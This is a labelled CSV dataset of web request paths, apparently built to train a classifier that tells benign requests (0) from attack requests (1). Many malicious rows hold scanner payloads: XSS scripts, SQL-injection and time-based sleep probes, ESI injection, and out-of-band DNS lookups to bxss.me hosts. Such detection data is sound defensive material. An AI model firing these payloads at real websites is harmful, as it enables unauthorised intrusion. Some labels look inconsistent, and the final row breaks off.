request	label
/****/jtdt/2020_jtyw/202012/t20201201_264215.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(1019)"">?_=1630311691868"	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u0433\ufffd\ufffd\ufffd\u03f4\ufffd\u063b\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/*****/system/2020/10/14/javascript:window.print()	1
"/***/2019<esi:include src=""""http://bxss.me/rpb.png""""/>/11/15/art_390_182836.html"	1
/*****/system/2011/11/28/010551281_01.shtml	0
/****/gjdjbn/djbn_zyjh/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/0/01/95/50/1955003_775334.jpg	0
/****/\ufffd\u00b5\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u558a\u53eb\u6c34\u4e61\u5468\u7389\u6c5f\u7852\u7802\u74dc\u8d2d\u9500\u7ecf\u7eaa\u4eba	0
/****/tskmh/201903/ywly/gccb/xwzx/jtdt/rssdy/wzdt/qtyz/	0
/***/400/11/05/19/11051960_918118.jpg	1
/****/20210901/10399.html	0
"/****/openemr/?site="""">alert(777);"	1
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u96d5\u9f99\u753b\u6846\u7cbe\u7f8e\u88c5\u9970\u90e8	0
"/**/products/heavymachinery/201505/"""""	0
/*****/newspic/newspic010g/img_2348.jpg	0
"/******/web/messagebook/script/messagebook.js/<img src=""javascript:alert(5752)"">"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7fcc\u5f95\u987a\u4e94\u91d1\u673a\u7535\u7ecf\u9500\u90e8	0
/**/system/2019/10/16/011848601.shtml	0
/****/gjzqq/oz/bels/201412/w020141212417683818087.gif	0
/****/czgk/bmjs/qtdw/zzqzfgjjglb/202108/t20210812_2972651.html	0
/****/bmkx/sfgw/201901/w020190104597312585589.png	0
/****/b-e348629.html	0
/**********/system/2021/12/08/013491603.shtml	0
/****/	1
/****/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx	1
/***/blockdata/getsearchinfo.do?&title=\u53cd\u72b9\u4e3b\u4e49	0
"/**/index.php?action=list&order=nan""/><script>alert(777);</script>me&srt=yes"	1
/******/visitcount/visit.jsp?i_columnid[1]==1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1080447799')))>'0&i_columnid[0]=exp&i_webid=1&type=1	1
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/202007/t20200701_168701.html	0
/************/action/document/init/1472779430161043456-1472779430177820672-595?senior=undefined&_=1639972956085	0
/****/201806/t20180620_188343.html	0
/****/20210306/e117653062.html	0
/**********/system/2021/10/04/javascript:window.close();	1
/**********/system/2020/09/28/013256212.shtml	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(3668)</script>?_=1630311999630"	1
/*******/6801vd8.php	1
/****/bmkx/skjj/201610/t20161025_12104_wap.html	0
/**/viewspace-322.html	0
/**********/system/2020/05/04/013154233.shtml	0
/****/bmkx/sfgw/201610/t20161025_14207.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8fce\u6c34\u9547\u4f55\u6ce2\u670d\u88c5\u5e97	0
/*****/javascript/bootstrap/fonts/glyphicons-halflings-regular.woff	0
/****/bmkx/sjsj/201704/t20170420_89106.html	0
/****/category/silutouzi?page=1</script><script>z9xk(9673)</script>	1
/zwxx_11337/****/202111/t20211110_3121992.html/index_1.html	0
"/****/zfwjn/1088/1097/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(114).concat(68).concat(108).concat(70) (require""""socket""""
socket.gethostbyname(""""hitxe"""" """"ybglbiay9ddf2.bxss.me."""")[3].to_s) """""	1
/******/yjw2.pdf	0
/****/ilist.jsp?cat_id=2041	0
/***********/userservice.aspx?dbid=5' and 6022=6150 and 'ljlo'='ljlo	1
"/****/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
/**********/system/2021/12/04/013489900.shtml	0
/****/20211216/10904.html	0
/****/rn9gmz-article-e109059659.html	0
/****/bmkx/snmj/202005/w020200521328480914685.png	0
/****/201909/t20190926_1757867.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19105100240158490981_1640026150685	0
"/************/search/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&tpl=16&websiteid=110105008056111"	1
/****/xxgkml/qtfdxx/zcjd/qwjd/202101/t20210107_175859.html	0
/****/xqdt/hnx/202010/local	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4e07\u5fb7\u946b\u5546\u5e97	0
/****/bmkx/jtysj/202008/t20200807_170928.html	0
/******/xxsjd/img2/7.jpg	0
/****/whhd/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/***/interface/comul_total.json.jsp?callback=jquery19109917872956464298_1640026059536	0
/zwxx_11337/****/202003/t20200316_1991015.html	0
/****/zfxxgk/zfxxgkzd_40887	0
/**/images/mbtn_menu.png	0
/***/app/homepage.z?perid=51216	1
/****/slide.aspx?id=1 and 1=1	1
"/****/search.jspx?q="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink();""//"	1
"/cgi-bin/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="""">alert(/777/)&false_positives=without&sort=&asc=false&commit=search"	1
/**********/system/2021/12/10/013492569.shtml	0
/****/qjrki6-hynews-e107237673.html	0
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/201802/w020180211350980449235.gif	0
/***/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/czgk/bmjs/zzqjcyxt/lwsrmjcy/201805/t20180524_765522.html	0
/****/thumb.php?src=<body onload=alert(777)>.jpg	1
/****/gccb/qgzfgc/	1
/zwxx_11337/****/index_11.html	0
/*******/qiye/b-e700681.html	0
/**/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
"/****/gjzqq/index.html?continent=') or 4417=4417 	1
/******/public/2020/10/10/99887.images/v99887_b1602314040367_app.jpg	0
/*****/newspic/newspic010g/img_2313.jpg	0
"/*********/*/-->'""""></iframe></script></style></title></textarea><script >alert(93696)</script>"	1
/****/system/2021/05/06/javascript:window.print()	1
/*****/20171020/3847.html	0
/*******/qiye/b-e2112652.html	0
"/****/libs/magpierss/scripts/magpie_simple.php?url=""""><img src= x onerror = alert(777)>url="""">"	1
"/**/""""<img src='http://attacker-9112/log.php?"	1
/****/gfxwj/201904/t20190410_1385028.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5927\u6218\u573a\u9547\u6842\u5170\u5546\u5e97	0
/******/download/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc') and 6207=1636 and ('xtdt'='xtdt	1
/**/system/2021/01/15/javascript:void(0);	1
/******/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script>	1
/*******/huihua.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5cf0\u827a\u8fbe\u88c5\u9970\u8bbe\u8ba1\u5de5\u7a0b\u6709\u9650\u516c\u53f8	0
/zwxx_11337/****/201707/t20170727_301230.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u540c\u4f19\u6c47\u97f3\u4e50\u4f1a\u6240	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1' or 3745=9377 /*&orderby=-docreltime&perpage=15&outlinepage=10	1
/**/system/2021/01/19/012116763.shtml	0
/**********/system/2020/05/20/013166204.shtml	0
/*******/202106/202106150949071019.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u8fdb\u90a6\u5546\u5e97	0
/***/0/01/26/07/1260704_146346.jpg	0
/*****/index/detail/art_id/222.html	0
/****/bmkx/slsj/201707/w020170707646389706531.jpg	0
/*********/treasury/index.aspx?nodeid=394);select sleep(5)	1
/************/bxss.me/jcse/110105008056111/16/images/jquery.waterfall.js	1
/****/b-e1179256.html	0
/******/uploadpic/image/20190603/1559545663795915.jpg	0
/****/zzxxgk/jjhzj/zsxw/202111/t20211108_196292.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5feb\u9012\u4e1a	0
/******/ew/20161024141306956.jpg	0
/******/system/2010/05/21/010127490.shtml	0
/****/category/fengxianjingshi?page=1 and 6534=6534--	1
/******/system/2014/07/07/011446443.shtml	0
/*/action%' and 2*3*8=6*8 and 'tv3o'!='tv3o%/showinfo/	1
/****/qzfwj/201806/t20180630_854361.html	0
/****/ccp_48498/zwhd/202112/t20211207_3206284.html	0
/******/system/2020/09/13/javascript:void(0);	1
/*******/qiye/b-e2046677.html	0
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new='.gethostbyname(lc('hitxc'.'avhyiehl84b67.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(107).chr(85).chr(106).chr(79).'	1
/****/bmkx/sgaj/201812/http://bxss.me/t/fit.txt?.jpg_112298.html	1
/if(now()=sysdate(),sleep(12),0)/****/znjs.htm	1
/*********/system/2010/07/21/010163649.shtml	0
/****/zsrc/goods.list.html?key=or 1=1 --	1
/****/kycg/kjjl/gjkj	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u56db\u5e73\u7231\u795e\u901a\u8baf\u90e8	0
/****/xxgkml/rsrm/201901/t20190102_113068.html	0
/****************/notification/negotiate?access_token=933a68be-948c-470d-b628-dd1175f14cda	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u9a6c\u6c38\u521a\u8f6e\u80ce\u7ecf\u9500\u90e8	0
/************/interfaces/dimension.do?cateid=1&eq=&oq=&p=if(now()=sysdate(),sleep(15),0)&pg=15&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &ranksign=&searchid=1&total=&tpl=16&websiteid=110105008056111	1
/****/rsrm/201506/w020170728621809719666.jpg	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5927\u901a\u5efa\u6750\u7ecf\u9500\u90e8	0
/****/ftl/common/menu/js/nav.js	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u8f66\u53cb\u6c7d\u8f66\u88c5\u9970\u5e97	0
/****/20200930/e107717225.html	0
/**/system/2021/12/13/javascript:void(0);	1
/*******/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active	1
/************/search.do?'.gethostbyname(lc('hitaa'.'deaofosc0edb4.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(101).chr(81).chr(118).chr(89).'	1
/***/blockdata/getsearchinfo.do?&title=\u6cf0\u56fd\u653f\u5e9c	0
/****/zdlygk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/zzq/zcwj.htm	1
/****/zfgzbg/201801/t20180128_680859.html	0
/****/20211209/10876.html	0
"/****/bmkx/sfgw/201809/"""	0
/****/tusby/tcgy/	0
/**/system/2021/12/16/012230889.shtml	0
/***/0/01/73/57/1735730_998266.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d89\u5916\u7a0e\u52a1\u4ee3\u7406\u4e8b\u52a1\u6240	0
/***/0/01/39/89/1398957_881470.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u665f\u946b\u5510\u88c5\u9970\u6750\u6599\u7ecf\u9500\u90e8	0
/****/xxgkml/qtfdxx/zdjcyjzj/201909/t20190930_142742.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u55e8\u8fa3\u6d77\u9c9c\u574a	0
/****/yfyfwpt/gjjcxsdqy/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1600&h=1600&treeid=1012&refer=&pagename=l2luzm8uannw&newsid=2001	0
/****/form.jspx?id=javascript:window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()//&channelid=1542	1
"/***/col6/index.html"""" and """"x""""=""""y"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u9686\u4ebf\u5efa\u8bbe\u5de5\u7a0b\u6709\u9650\u516c\u53f8	0
/**********/system/2021/11/10/013477923.shtml	0
/****/ and 1=1	1
/*******/ufk3z.php	1
/****/tzgg/tz17_6387/201811/t20181126_197777.html' and 'x'='y	1
/***/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1	1
/***/interface/daily_clickcount.json.jsp?callback=jquery1111047207533165340987_1639980673969	0
"/****/zzxxgk/tjj<esi:include src=""""http://bxss.me/rpb.png""""/>/zfxxgkml_2127/jytabljg_2061/list.html"	1
/****/qzfwj/201801/t20180115_668807.html	0
"/****/qzfwj/202012/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/****/kycg/kjjl/css/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*****/gy42/cpgyss.asp?key=\ufffd\u03fd\ufffd\ufffd40cr&showpage=1&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
"/**********/system/more/217000000000000'""""/><script >alert(1988);</script >/0045/217000000000000_00004535.shtml"	1
/**/viewspace-795.html	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448' and 8589=8589 and '1'='1&wbfileid=51419	1
/****/lhy/ldhd	0
"/******/1/jquery.superslide.2.1.js/""><script>alert(6472)</script>"	1
/****/ilist.jsp?cat_id=26130	0
/****/202104/t20210402_272196.html	0
/****/zfwjn/1088/1110/http://bxss.me/t/fit.txt.html	1
/****/jtdt/jt16/201609/t20160920_102155.html	1
/***/interface/comul_total.json.jsp?callback=jquery191021260318742207307_1640034779373	0
/****/czgk/bmjs/gdyx/index_1.html	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsft/201908/t20190808_1656044.html	0
"/****/zdlygk/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/gys/jyx.htm"	1
/*******/201909/201909250859101013.html	0
/***/blockdata/getsearchinfo.do?&title=\u5806	0
/zwxx_11337/****/202007/t20200722_2170097.html	0
/****/zgsdt/2020_qydt/index_2.html	0
/zwxx_11337/****/202101/t20210111_2566657.html	0
/******/system/2011/09/29/010483081.shtml	0
/***/jiupan.php	1
/****/wdszs/hfsz/202006/t20200613_167962_wap.html	0
/**********/system/2021/01/22/013324070.shtml	0
/**********/system/2021/10/27/013471021.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5b9c\u5b9d\u6e90\u8c46\u5236\u54c1\u52a0\u5de5\u5e97	0
/*************/ztsj/zt/msss/	0
/***/0/00/04/97/49799_044037.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u592a\u9633\u6881\u4e61\u767e\u5473\u9999\u5364\u8089\u5e97	0
/*****/system/2021/11/29/013487334.shtml	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u7965\u8018\u7855\u571f\u5730\u6d41\u8f6c\u670d\u52a1\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/bmkx/sgsj/202106/t20210607_183647.html	0
/****/czgk/bmyjs/zzqfyxt/qtxszjrmfy/201702/t20170208_318413.html	0
/**********/system/2021/04/07/013364849.shtml	0
/****/wdszs/hfsz/202103/t20210315_178609.html	0
/*****/df/	0
/****/sj1/tjxx/index_8.html	0
"/************/template'""""()&%<acx><script >vpin(9140)</script>/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js"	1
/****//828/j6u78dwl/xhr_send?t=1632366661108	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u7ea2\u658c\u9910\u5385	0
/****/web/search?channelid=299868&perpage=1000%') and 1660=9599 and '%'='	1
/**********/system/2021/10/02/javascript:void(0);	1
/******/usercenter/index?qrcode=20582	0
"/****/web/search?channelid=*/-->'""""></iframe></script></style></title></textarea><script >alert(31381)</script>&perpage=1000"	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u8f89\u7687\u4fe1\u606f\u90e8	0
/******/zwxxgk_bnt02b1.png	0
/_dwr/*********/if(now()=sysdate(),sleep(12),0).js	1
"/***/libs/magpierss/scripts/magpie_simple.php?url=""""><img src= x onerror = alert(777)>url="""">"	1
/****/gjjj/201903/t20190328_206040.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u65b0\u4e16\u5c4b\u670d\u88c5\u5e97	0
/****/xyfw/jcjg/sbjhhyzjzx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*/0w3f7k7z2/ecmsadmin.php	0
/**************/jianshe/dongtai	0
/***/viewspace-154.html	0
/******/hfjysj/202109/t20210908_186476.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9756\u7fd4\u5546\u5e97	0
/****/zgsdt/2014zgsdt/index_3.html	0
/zwxx_11337/****/zcjd/202003/t20200310_1985537.html	0
/******/rlzy/rcln/nbfw/rssdy/gjcp/hdzb/gjjtwzq/rssdy/ywly/jrytz/	0
/**********/rwgs/	0
/****/czgk/bmjs/sydw1/zfzshbsc/201808/t20180816_978008.html	0
/***/index.php?do=post&id=472&c=dt&a=goods&	1
"/************/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ "" and 2*3*8=6*8 and ""iyk7""=""iyk7&searchid=1&tpl=16&websiteid=110105008056111"	1
/*****/20211108/javascript:void(0);	1
/****/ysqgk/zzqzfzsjgzssydw/	0
/******/jslib%' and 2*3*8=6*8 and '4reb'!='4reb%/jquery/jquery.js	1
/*******/202104/202104151508301172.html	0
/****/xqdt/jtx/201610/t20161025_44137.html	0
/****/jtdt/2020_jtyw/202007/w020200701475538986250.jpg	0
/**/template.cfm?moduletitle=alert(777)	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u9ad8\u5d16\u4e61\u9999\u6c34\u9910\u5385	0
/****/login.html?status='</script><script>alert(777)</script>	1
/****/czgk/bmjs/zzqjcyxt/gysrmjcy/index_1.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtkmgofp2yqkg dsds4pmjiy=&openid=ovl7jjodzifre4pa8k5_4f-2at3u&outer_str=84578&activate_ticket=fdzv9emqaffrnr3xboqhbzag5bzk2swco7qasayiludhfifidrt1ejnprxbtx1zvgetfi6tpfanrmsfpbenvtuqn3wvc9rq32dqtsdmnreo=	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5b89\u742a\u62c9\u4ea7\u540e\u751f\u6d3b\u9986	0
/**/xgzt/index.shtml	0
/************/template/jcse/110105008056111/16/images/plugin//xfs.bxss.me/hzrecorder.js	1
/****/xwygx/202112/kjcx/xyfw/bzhwyh/xwzx/mtgz/2021_mtgz/202103/t20210314_271326.html	0
/****/tzgg/202003/t20200304_1978986_zzb.html	0
/****/xxgkml/qtfdxx/zcjd/qwjd/201611/t20161111_72657.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9ed1\u4eae\u519c\u4e1a\u673a\u68b0\u7ecf\u9500\u4e13\u4e1a\u5408\u4f5c\u793e	0
/******/system/2021/03/04/javascript:window.close();	1
/****/yjh/ldhd/	0
/**********/system/2020/10/27/013271942.shtml	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u57ce\u80dc\u5a25\u5546\u5e97	0
/***********/jinrongqihuo/guzhiqihuo/index_0'xor(if(now()=sysdate(),sleep(9),0))xor'z.html	1
/**/system/2021/01/22/javascript:void(0);	1
/****/mtgz/2021_mtgz/202105/t20210505_273338.html and 1>1	1
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u590f\u53d4\u53d4\u9e21\u6392\u5e97	0
/****/web/search?channelid=206504	0
/****/web/index.jsp	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4f4f\u5b85	0
"/****/byysqgk/"""".gethostbyname(lc(""""hitkd"""".""""ptysbdxm00bcb.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(118).chr(83).chr(97).chr(82).""""/list.html"	1
/****/mtgz/2012mtgz/201412/t20141218_44684.html	0
/******/system/2016/09/19/012135409.shtml	0
/******/xxsjd/bmxx/	0
/******/visitcount/visit.jsp?i_columnid[0]=exp'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1503843923')))>'0&i_columnid[1]==1&i_webid=1&type=1	1
/****/tag_test_action.php?partcode={dede:field name='source' runphp='yes'}echo md52069475662&token=&url=a&{/dede:field}=	1
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/202112/w020211206439799286730.png	0
/***********/tuanduijieshao/javascript:void(0)	1
/****/tzgg/2021_tzgg/202112/t20211201_322580.html	0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zfzfjbsc/201802/t20180223_693384.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u97e6\u5dde\u9547\u9e3f\u8fd0\u6c7d\u8f66\u88c5\u6f62\u90e8	0
/****/\ufffd\u03f2\ufffd	0
/****/jjgz/202009/t20200922_253814.html and 1=1	1
/zwxx_11337/****/201904/w020190425320051624883.jpg	0
/*******/qiye/b-e2009992.html	0
/**********/system/2020/04/23/013147188.shtml	0
/*****/system/2021/07/30/javascript:void(0);	1
/***/public.cgi	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9ad8\u5fe0\u5fb7\u8d27\u8fd0\u90e8	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtflf pt8mr0zwwlw6wmm6j8=&openid=ovl7jjsvk1f5eht9cmbvrg4zyudm&outer_str=2048&activate_ticket=fdzv9emqaffrnr3xboqhbzidu1jajwd4l/fol7wxf/xhfifidrt1ejnprxbtx1zv8xv1zudbua7cfg4azqybhrdh6e9z5wbyneoa2t7bnoe=	0
/*************/zwgk/czgk/bmjs/rmtt/fxh/	0
/hire_prd/*****/index.html?hireid=mtawnjkzodg=&hire_class=b&type=1&recruit_type=1	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u71d5\u5b50\u7a97\u5e18\u5e97	0
/**********/system/2020/05/28/013172772.shtml	0
"/****/zzxxgk/tjj/"""".gethostbyname(lc(""""hitrd"""".""""ugalzlcu31f2d.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(118).chr(69).chr(111).chr(67).""""_2127/jgzn_2042/list.html"	1
/**********/index_if(now()=sysdate(),sleep(6),0).html	1
/*****/gy48/ljcpgyview.asp?id=42567501&l=\ufffd\ufffd\ufffd	0
/****/gjzqq/ and 1=1	1
/******/20190913.jpg	0
/*****/gy42/cpgyss.asp?key=\u0562\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/jsxmhjyx/hjyxpf/201912/t20191201_144981.html	0
/*******/qiye/b-e2515977.html	0
/****/xh/hd/201705/w020170728435206728406.jpg	0
/****/system/2017/06/02/javascript:dozoom(12)	1
/*****/system/2021/11/08/javascript:window.print()	1
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201808/t20180810_162710.html	0
/****/xqdt/byq/201806/t20180611_104313.html	0
"/******/5/' 'a'.concat(70-3).concat(22*4).concat(105).concat(72).concat(114).concat(74) (require'socket'
